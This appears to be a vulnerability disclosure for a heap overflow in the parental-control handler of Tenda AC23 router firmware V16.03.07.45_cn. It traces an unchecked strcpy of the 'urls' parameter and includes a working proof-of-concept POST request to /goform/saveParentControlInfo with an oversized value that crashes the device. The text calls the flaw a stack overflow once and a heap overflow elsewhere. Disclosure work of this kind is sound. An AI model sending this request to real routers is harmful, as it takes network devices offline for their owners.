# Tenda AC23 V16.03.07.45_cn heap overflow vulnerability

## Firmware information

- Manufacturer's address: https://www.tenda.com.cn/
- Firmware download address: https://www.tenda.com.cn/download/detail-3420.html

## Affected version

I have verified that **Tenda AC23 V16.03.07.45_cn** products have stack overflow vulnerability, and other series products have not been verified for the time being.

## Vulnerability details

![image-20230811094531781](./img/image-20230811094531781.png)

```
saveParentControlInfo -> get_parentControl_list_Info
```

`saveParentControlInfo`

![image-20230811094845590](./img/image-20230811094845590.png)

`get_parentControl_list_Info`

![image-20230811095044456](./img/image-20230811095044456.png)

`get_parentControl_list_Info` gets the parameter **urls** from the user input, but does not verify the length of the user input. The `strcpy` function is then called to assign **urls** directly to the second parameter, which is the heap space allocated by the parent function via `malloc`, resulting in a **heap overflow** vulnerability.

Then, the `getparentcontrolinfo` function is called, which in turn calls `malloc`, causing the program to crash.

## POC

```
POST /goform/saveParentControlInfo HTTP/1.1
Host: 192.168.0.1
Content-Length: 2161
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/parental_control.html?random=0.9022020837028655&
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: password=25d55ad283aa400af464c76d713c07adluecvb
Connection: close

deviceId=00%3A1b%3A44%3A11%3A3a%3Ab7&deviceName=&enable=1&time=19%3A00-21%3A00&url_enable=1&urls=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&day=1%2C1%2C1%2C1%2C1%2C1%2C1&limit_type=0
```

**heap overflow**

![image-20230819141548188](./img/image-20230819141548188.png)

![image-20230819141639605](./img/image-20230819141639605.png)

**crash**

![image-20230819141820174](./img/image-20230819141820174.png)

![image-20230819141904184](./img/image-20230819141904184.png)
